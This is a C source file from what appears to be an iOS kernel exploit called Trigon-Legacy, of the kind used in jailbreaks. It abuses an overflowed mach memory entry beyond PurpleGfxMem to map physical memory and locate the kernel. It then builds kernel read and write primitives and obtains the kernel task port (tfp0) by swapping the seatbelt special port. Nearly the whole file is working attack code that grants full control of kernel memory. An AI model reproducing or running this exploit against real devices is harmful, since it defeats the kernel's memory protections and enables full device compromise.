// trigon-legacy.c
// Trigon-Legacy, 2025

#include "trigon-legacy.h"

mach_port_t largeMemoryEntry = MACH_PORT_NULL;
uint64_t gMappingBase = 0;
struct device_info* dev_info = NULL;

static uint64_t get_ktask_itk_bootstrap (uint64_t receiver, uint64_t self_task) {
    struct kstruct_offsets *offsets = &dev_info->kstruct_offsets;
    uint64_t is_table = pipe_read_64(receiver + offsets->is_table);
    DEBUG("Is table: %#llx", is_table);

    uint64_t self_port_addr = find_port_from_is_table(is_table, mach_task_self());
    DEBUG("Self port addr: %#llx", self_port_addr);

    uint64_t ipc_space_kernel = pipe_read_64(self_port_addr + offsets->ipc_port_ip_receiver);
    DEBUG("IPC space kernel: %#llx", ipc_space_kernel);

    uint64_t itk_bootstrap = pipe_read_64(self_task + offsets->task_itk_bootstrap);
    DEBUG("ITK bootstrap: %#llx", itk_bootstrap);

    uint64_t launchd_itk_space = pipe_read_64(itk_bootstrap + offsets->ipc_port_ip_receiver);
    DEBUG("Launchd itk space: %#llx", launchd_itk_space);
    
    uint64_t launchd_task = pipe_read_64(launchd_itk_space + offsets->is_task);
    DEBUG("Launchd task: %#llx", launchd_task);
    uint64_t curr_task = launchd_task;
    uint64_t curr_proc = 1;
    while (curr_task) {
        curr_task = pipe_read_64(curr_task + offsets->task_prev);
        if (!curr_task) {
            ERR("curr_task is null!");
            break;
        }
        curr_proc = pipe_read_64(curr_task + offsets->task_bsd_info);
        if (!curr_proc) {
            ERR("curr_proc is null!");
            cleanup_pipe_state();
            return 0;
        }
        uint32_t pid = pipe_read_32(curr_proc + offsets->proc_pid);
        if (pid == 0) {
            LOG("Found kernel task! (pid 0) curr_task: %#llx", curr_task);
            dev_info->kernel_state.kernproc = curr_proc;
            break;
        }
    }

    uint64_t kernel_task = curr_task;
    return kernel_task;
};

// static uint64_t turn_port_into_tfp0(uint64_t port_addr, uint64_t kernel_task) {
//     // uint64_t kernel_vm_map = early_rk64(kernel_task + offsetof(ktask_t, map));
//     // ktask_t* fake_task = malloc(sizeof(ktask_t));
//     // memset(fake_task, 0, sizeof(ktask_t));

//     // fake_task->lock.data = 0x0;
//     // fake_task->lock.type = 0x22;
//     // fake_task->ref_count = 69;
//     // fake_task->active = 1;
//     // fake_task->map = kernel_vm_map;

//     // /**
//     // We need kalloc
//     // We have kalloc at home
//     // kalloc at home:
//     // */
    
//     // int p[2];
//     // int ret = pipe(p);
//     // write(p[1], fake_task, sizeof(ktask_t));
//     // // find pipebuffer containing our fake task
//     // uint64_t our_proc = early_rk64(self_task + 0x2f0); // KSTRUCT_OFFSET_TASK_BSD_INFO
//     // uint64_t p_fd = early_rk64(our_proc + 0xf0); // 0xF0 for 9.0, 0x108 for 9.1 and 9.2
//     // uint64_t fd_ofiles = early_rk64(p_fd + 0x0); // FD_OFILES
    
//     // uint64_t fproc = early_rk64(fd_ofiles + p[0] * sizeof(uint64_t));
//     // uint64_t f_fglob = early_rk64(fproc + 0x8); // the pipe
//     // uint64_t fg_data = early_rk64(f_fglob + 0x38); // pipe (pipebuf is 0x0)
//     // printf("Pipe data: %llx\n", fg_data);
//     // uint64_t fake_task_addr = early_rk64(fg_data + 0x10); // pipebuf buffer
//     // printf("Fake task addr: %llx\n", fake_task_addr);

//     pipe_write_32(port_addr + 0x0, IO_BITS_ACTIVE | IKOT_TASK); // IO_BITS
//     pipe_write_32(port_addr + 0x4, 0xf00d); // IO_REFERENCES
//     pipe_write_32(port_addr + dev_info->kstruct_offsets.ipc_port_ip_srights, 0xf00d);
//     pipe_write_64(port_addr + dev_info->kstruct_offsets.ipc_port_ip_receiver, ipc_space_kernel); // IP_RECEIVER -> IPC_SPACE_KERNEL 0x60 for iOS 10
//     pipe_write_64(port_addr + dev_info->kstruct_offsets.ipc_port_ip_kobject, kernel_task); // IP_KOBJECT
//     //early_wk64(port_addr + dev_info->kstruct_offsets.ipc_port_ip_kobject, fake_task_addr); // IP_KOBJECT // fake task 10.3+ 0x68 for 10
    
//     // Flip receive right to send right
//     uint32_t port_index = tfp0 >> 8;
//     const int sizeof_ipc_entry_t = 0x18;
//     uint32_t bits = pipe_read_32(is_table + (port_index * sizeof_ipc_entry_t) + 8); // ipc_entry->ie_bits
//     #define IE_BITS_SEND (1<<16)
//     #define IE_BITS_RECEIVE (1<<17)
//     bits &= (~IE_BITS_RECEIVE);
//     bits |= IE_BITS_SEND;
//     pipe_write_32(is_table + (port_index * sizeof_ipc_entry_t) + 8, bits);
// }

static uint64_t get_ktask_via_proc(uint64_t self_proc) {
    uint64_t proc = pipe_read_64(self_proc);
    while (proc) {
        uint64_t proc_pid = pipe_read_32(proc + dev_info->kstruct_offsets.proc_pid);
        if (proc_pid == 0) {
            DEBUG("Found kernproc (PID %llu)!", proc_pid);
            dev_info->kernel_state.kernproc = proc;
            break;
        }
        proc = pipe_read_64(proc);
    }
    return pipe_read_64(dev_info->kernel_state.kernproc + dev_info->kstruct_offsets.proc_task);
}

mach_port_t get_tfp0(IOSurfaceRef surface, mach_port_t parentEntry) {
    kern_return_t err = KERN_FAILURE;
    mach_port_t tfp0 = MACH_PORT_NULL;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &tfp0);
    uint64_t tfp0_port_addr = leak_port_addr(tfp0, surface);
    DEBUG("TFP0 port addr: %#llx", tfp0_port_addr);

    struct kstruct_offsets *offsets = &dev_info->kstruct_offsets;

    uint64_t receiver = early_rk64(tfp0_port_addr + offsets->ipc_port_ip_receiver);
    DEBUG("Receiver: %#llx", receiver);

    uint64_t self_task = early_rk64(receiver + offsets->is_task);
    DEBUG("Self task: %#llx", self_task);

    uint64_t self_proc = early_rk64(self_task + offsets->task_bsd_info);
    DEBUG("Self proc: %#llx", self_proc);

    struct pipe_exploit_state *state = &dev_info->pipe_state;
    if (exploit_pipe_init(state, self_proc) != RET_SUCCESS) {
        ERR("Failed to init pipe rw state");
        goto cleanup;
    }

    //uint64_t kernel_task = get_ktask_via_proc(self_proc);
    uint64_t kernel_task = get_ktask_itk_bootstrap(receiver, self_task);
    if (!kernel_task) {
        ERR("Failed to get kernel task");
        goto cleanup;
    }
    DEBUG("Kernel task: %#llx", kernel_task);

    uint64_t kernel_itk_self = pipe_read_64(kernel_task + offsets->task_itk_self);
    DEBUG("Kernel itk self: %#llx", kernel_itk_self);
    uint64_t old_seatbelt_port_addr = pipe_read_64(self_task + offsets->task_itk_seatbelt);
    DEBUG("Old seatbelt port addr: %#llx", old_seatbelt_port_addr);
    pipe_write_64(self_task + offsets->task_itk_seatbelt, kernel_itk_self);
    DEBUG("Wrote kernel port addr to itk seatbelt");

    task_get_special_port(mach_task_self(), TASK_SEATBELT_PORT, &tfp0);
    pipe_write_64(self_task + offsets->task_itk_seatbelt, old_seatbelt_port_addr);
    DEBUG("Restored seatbelt port addr");
    
    vm_offset_t data_out = 0;
    mach_msg_type_number_t out_size = 0;
    err = mach_vm_read(tfp0, tfp0_port_addr, 0x8, &data_out, &out_size);
    if(err != KERN_SUCCESS) {
        ERR("read failed not tfp0, rip");
        cleanup_pipe_state();
        goto cleanup;
    }

    LOG("tfp0: %x", tfp0);
    dev_info->kernel_state.tfp0 = tfp0;
    vm_deallocate(mach_task_self(), data_out, out_size);

    cleanup_pipe_state();
    return tfp0;

cleanup:
    cleanup_pipe_state();
    if (tfp0 != MACH_PORT_NULL) {
        mach_port_deallocate(mach_task_self(), tfp0);
    }
    return MACH_PORT_NULL;
}

ret_t trigon_legacy(void) {
    mach_timebase_info_data_t timebase;
    mach_timebase_info(&timebase);
    uint64_t start = mach_absolute_time();
    
    ret_t ret = RET_ERR;
    IOSurfaceRef surface = NULL;
    mach_port_t parentEntry = MACH_PORT_NULL;

    dev_info = (struct device_info*)malloc(sizeof(struct device_info));
    if (init_device_info(dev_info) != RET_SUCCESS) {
        ERR("Failed to initialize device info");
        goto cleanup;
    }
    
    // Create an IOSurface that has its memory region inside PurpleGfxMem
    surface = create_purplegfxmem_iosurface();
    if (!surface) {
        ERR("Failed to create IOSurface");
        goto cleanup;
    }
    DEBUG("IOSurface for PurpleGfxMem: %p", surface);
    void *baseAddr = get_base_address(surface);
    if (!baseAddr) {
        goto cleanup;
    }

    uint64_t size = 0x4000;
    kern_return_t kr = KERN_FAILURE;
    kr = mach_make_memory_entry_64(mach_task_self(), &size, (memory_object_offset_t)baseAddr, VM_PROT_DEFAULT, &parentEntry, 0);

    if (kr != KERN_SUCCESS) {
        ERR("Failed to create parent entry for PurpleGfxMem (%#X)", kr);
        parentEntry = MACH_PORT_NULL;
        goto cleanup;
    }
    DEBUG("Created parent entry under PurpleGfxMem");
    
    // Create malicious entry to cover outside of PurpleGfxMem
    size_t phys_align = dev_info->kernel_config.phys_align;
    uint64_t overflowedSize = -(uint64_t)phys_align;
    uint64_t overflowedOffset = 2 * phys_align;
    kr = mach_make_memory_entry_64(mach_task_self(), &overflowedSize, overflowedOffset, VM_PROT_DEFAULT, &largeMemoryEntry, parentEntry);
    if (kr != KERN_SUCCESS) {
        ERR("Failed to create large memory entry (%#X)", kr);
        largeMemoryEntry = MACH_PORT_NULL;
        goto cleanup;
    }
    DEBUG("Created large memory entry");
    uint64_t mapping_offset = phys_align;
    size_t map_size = phys_align;
    while (1) {
        mach_vm_address_t mapping_addr = map_at_offset(mapping_offset, map_size);
        if (mapping_addr == -1) {
            ERR("Failed to map in offset %#llx", mapping_offset);
            mapping_offset += map_size;
            continue;
        }

        size_t scan_step = dev_info->kernel_config.pagesize;
        int found = 0;
        for (size_t off = 0; off < map_size; off += scan_step) {
            uint64_t val = *(uint64_t *)(mapping_addr + off);
            if (val == SLEEP_TOKEN_MAGIC) {
                LOG("Found sleep token buffer base at %#llx", mapping_offset + off);
                gMappingBase = dev_info->kernel_config.sleep_token_buffer_base - (mapping_offset + off);
                LOG("Mapping base is %#llx", gMappingBase);
                found = 1;
                break;
            }
        }
        mach_vm_deallocate(mach_task_self(), mapping_addr, map_size);
        if (found) break;
        mapping_offset += map_size;
    }
    uint64_t phys_kbase = find_phys_kbase_static();
    DEBUG("Physical Kernel base (guessed): %#llx", phys_kbase);
    // A7 and A8 are static so this shouldn't impact anything
    uint64_t phys_slide_step = 0x200000; // 1 << 21
    DEBUG("Physical slide step: %#llx", phys_slide_step);
    if (phys_kbase) {
        mapping_offset = phys_kbase - gMappingBase;
        for (int i = 0; i < 16; i++) {
            mach_vm_address_t mapping_addr = map_at_offset(mapping_offset, dev_info->kernel_config.pagesize);
            if (mapping_addr == -1) {
                break;
            }
            if (isKernelHeader(mapping_addr)) {
                dev_info->kernel_state.kPhysBase = gMappingBase + mapping_offset;
                LOG("Physical Kernel base %#llx, Offset from mapping base %#llx", dev_info->kernel_state.kPhysBase, -mapping_offset);
                if (parse_kernel_header(dev_info, mapping_addr) != RET_SUCCESS) {
                    ERR("Failed to parse kernel header");
                    mach_vm_deallocate(mach_task_self(), mapping_addr, dev_info->kernel_config.pagesize);
                    break;
                }
                mach_vm_deallocate(mach_task_self(), mapping_addr, dev_info->kernel_config.pagesize);

                mach_port_t tfp0 = get_tfp0(surface, parentEntry);
                if (tfp0 == MACH_PORT_NULL) {
                    ERR("Failed to get tfp0");
                    goto cleanup;
                }

                uint64_t end = mach_absolute_time();
                uint64_t elapsed = end - start;
                double elapsed_ms = (double)elapsed * timebase.numer / timebase.denom / 1e6;
                LOG("Time taken for tfp0: %.3f ms", elapsed_ms);
                ret = RET_SUCCESS;
                break;
            }
            mach_vm_deallocate(mach_task_self(), mapping_addr, dev_info->kernel_config.pagesize);
            mapping_offset += phys_slide_step;
        } 
    } else {
        ERR("Failed to find (guessed?) physical kernel base, aborting");
        goto cleanup;
    }

cleanup:
    if (largeMemoryEntry != MACH_PORT_NULL) {
        mach_port_deallocate(mach_task_self(), largeMemoryEntry);
        largeMemoryEntry = MACH_PORT_NULL;
    }
    if (parentEntry != MACH_PORT_NULL) {
        mach_port_deallocate(mach_task_self(), parentEntry);
    }
    if (surface) {
        CFRelease(surface);
    }
    if (dev_info) {
        free(dev_info);
        dev_info = NULL;
    }
    return ret;
}
